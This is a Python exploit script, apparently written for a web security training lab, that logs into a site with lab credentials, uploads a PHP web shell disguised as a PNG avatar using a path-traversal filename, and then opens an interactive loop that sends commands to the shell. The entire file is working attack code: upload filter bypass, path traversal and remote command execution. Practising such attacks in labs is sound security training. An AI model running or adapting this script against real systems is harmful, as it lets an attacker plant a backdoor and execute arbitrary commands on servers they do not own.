import sys
import requests
from bs4 import BeautifulSoup as bs
from requests_toolbelt import MultipartEncoder
import random, string
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def csrft(url, s):
    r = s.get(url, verify=False, proxies=proxies)
    soup = bs(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    return csrf

def probe(url, s):
    print("Input commands or type exit to leve.")
    u = url + "files/shell.php?cmd="
    c = ""
    while c != "exit":
        c = input("# ")
        up = u + c
        r = s.get(up, verify=False, proxies=proxies)
        if len(r.text) != 0:
            print(r.text)
        else:
            print("Response size zero.")

def upload(url, s):
    print("Uploading File...")
    u = url + "my-account/avatar"
    uc = url + "my-account"
    csrf = csrft(uc, s)
    fileshell = {'avatar':('..%2fshell.php',"<?php system($_GET['cmd']); ?>","image/png"),'user':'wiener','csrf':csrf}
    boundary = "---------------------------179091273795350098189507918"
    m = MultipartEncoder(fields=fileshell,boundary=boundary)
    headers = {'Content-Type':m.content_type}
    r = s.post(u, data=m, headers=headers, verify=False, proxies=proxies)
    if "../" in r.text:
        print("Success, file uploaded :)")
        probe(url, s)
    else:
        print("Error uploading file :(")

def login(url, s, csrf):
    u = url + "login"
    data = {'csrf':csrf, 'username':'wiener', 'password':'peter'}
    r = s.post(u, data=data, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("Logged in...")
        upload(url, s)
    else:
        print("Login failed...")

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()
    url = sys.argv[1]
    u = url + "login"
    csrf = csrft(u, s)
    login(url, s, csrf)


if __name__ == '__main__':
    main()
